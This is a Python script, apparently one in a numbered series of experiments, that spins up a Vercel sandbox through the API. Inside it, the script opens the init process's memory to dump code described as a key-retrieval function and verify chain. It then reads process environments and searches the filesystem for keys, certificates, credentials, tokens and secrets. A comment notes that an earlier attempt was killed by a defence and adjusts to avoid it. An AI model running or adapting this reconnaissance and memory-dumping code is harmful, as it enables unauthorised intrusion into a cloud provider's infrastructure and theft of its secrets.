# 实验J212: dump 0x571700(key获取函数) + 0x46e940/0x46f0c0(verify链) 代码
# + 文件系统侦察key文件 + env + /run/vercel/share目录
# 注: j211教训: 请求触发verify时python3被单独杀, 本实验不发请求
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=30000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj212"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# 1) dump 函数代码
CODE = r'''
import os
out = open("/tmp/d212.txt", "w")
def p(*a):
    line = " ".join(str(x) for x in a)
    out.write(line + "\n"); out.flush()
    print(line, flush=True)
fd = os.open("/proc/1/mem", os.O_RDWR)
def read_at(addr, n):
    os.lseek(fd, addr, 0)
    return os.read(fd, n)
p("start")
for name, addr, size in [("F571700", 0x571700, 0x500), ("F46e940", 0x46e940, 0x300),
                          ("F46f0c0", 0x46f0c0, 0x300), ("F50d240", 0x50d240, 0x100)]:
    try:
        code = read_at(addr, size)
        p("FUNC", name, hex(addr), size)
        p("HEX", name, code.hex())
    except Exception as e:
        p("ERR", name, repr(e))
p("done")
out.close()
os.close(fd)
'''
st = run_cmd(sid, CODE, "J212_DUMP", timeout=120)
time.sleep(2)
bashfile(sid, "cat /tmp/d212.txt", "marker", 30000)

# 2) 文件系统侦察
bashfile(sid, "ls -la /run/vercel/share/ 2>&1; echo ===; ls -la /run/vercel/ 2>&1; echo ===; cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -40; echo ===; env | head -40", "FS1", 4000)

# 3) find key文件 + 敏感目录
bashfile(sid, "find / -xdev -name '*key*' -o -name '*.pem' -o -name '*.crt' -o -name '*cred*' -o -name '*token*' -o -name '*secret*' 2>/dev/null | grep -v proc | head -30; echo ===; ls -la /vercel/ 2>&1; echo ===; ls -la /etc/vercel* /vercel/sandbox 2>&1 | head -30", "FS2", 4000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
